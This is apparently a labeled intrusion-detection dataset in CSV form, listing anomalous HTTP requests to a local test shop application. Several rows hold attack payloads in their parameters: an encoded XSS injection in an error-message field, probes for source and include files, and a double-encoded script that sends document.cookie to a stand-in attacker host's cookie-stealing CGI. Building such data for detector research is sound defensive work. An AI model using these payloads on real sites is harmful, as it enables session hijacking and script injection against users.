index,method,url,protocol,userAgent,pragma,cacheControl,accept,acceptEncoding,acceptCharset,acceptLanguage,host,connection,contentLength,contentType,cookie,payload,label
15062,GET,http://localhost:8080/tienda1/publico/autenticar.jsp,HTTP/1.1,Mozilla/5.0 (compatible Konqueror/3.5 Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,close,null,null,JSESSIONID=5B41656538D8E3AA2B7B4D7CF17EA76E,pwd=duc9i89,anom
15062,GET,http://localhost:8080/tienda1/publico/autenticar.jsp,HTTP/1.1,Mozilla/5.0 (compatible Konqueror/3.5 Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,close,null,null,JSESSIONID=5B41656538D8E3AA2B7B4D7CF17EA76E,remember=on,anom
15062,GET,http://localhost:8080/tienda1/publico/autenticar.jsp,HTTP/1.1,Mozilla/5.0 (compatible Konqueror/3.5 Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,close,null,null,JSESSIONID=5B41656538D8E3AA2B7B4D7CF17EA76E,B1=Entrar,anom
15063,GET,http://localhost:8080/asf-logo-wide.gif.java,HTTP/1.1,Mozilla/5.0 (compatible Konqueror/3.5 Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,close,null,null,JSESSIONID=C2D7FE55801B2D1B7751B4122D7A86A7,,anom
15064,GET,http://localhost:8080/tienda1/publico/caracteristicas.jsp/4861362529278789730,HTTP/1.1,Mozilla/5.0 (compatible Konqueror/3.5 Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,close,null,null,JSESSIONID=0950D64B7DA2D46EC96129FC3CD70605,,anom
15065,GET,http://localhost:8080/tienda1/publico/caracteristicas.jsp.inc,HTTP/1.1,Mozilla/5.0 (compatible Konqueror/3.5 Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,close,null,null,JSESSIONID=B5F810A66D0BD75C10C3E3C3F74EEC7D,,anom
15066,GET,http://localhost:8080/tienda1/publico/entrar.jsp,HTTP/1.1,Mozilla/5.0 (compatible Konqueror/3.5 Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,close,null,null,JSESSIONID=76AF6769C1E7F509221552D5F34D723C,errorMsg=Credenciales+incorrectasparos%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29,anom
15067,GET,http://localhost:8080/tienda1/publico/entrar.jsp,HTTP/1.1,Mozilla/5.0 (compatible Konqueror/3.5 Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,close,null,null,JSESSIONID=C5DF82D735C1D2CBFABB5ADB1ACA0B07,errorMsg=%3F,anom
15068,GET,http://localhost:8080/tienda1/publico/entrar.jsp,HTTP/1.1,Mozilla/5.0 (compatible Konqueror/3.5 Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,close,null,null,JSESSIONID=B26F9325F720477E5825238D621019B6,errorMsgA=Credenciales+incorrectas,anom
15069,GET,http://localhost:8080/tienda1/publico/pagar.jsp,HTTP/1.1,Mozilla/5.0 (compatible Konqueror/3.5 Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,localhost:8080,close,null,null,JSESSIONID=896F697AB63AEEF8FAC1FCAD2541D9E6,modo=insertarsessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F,anom
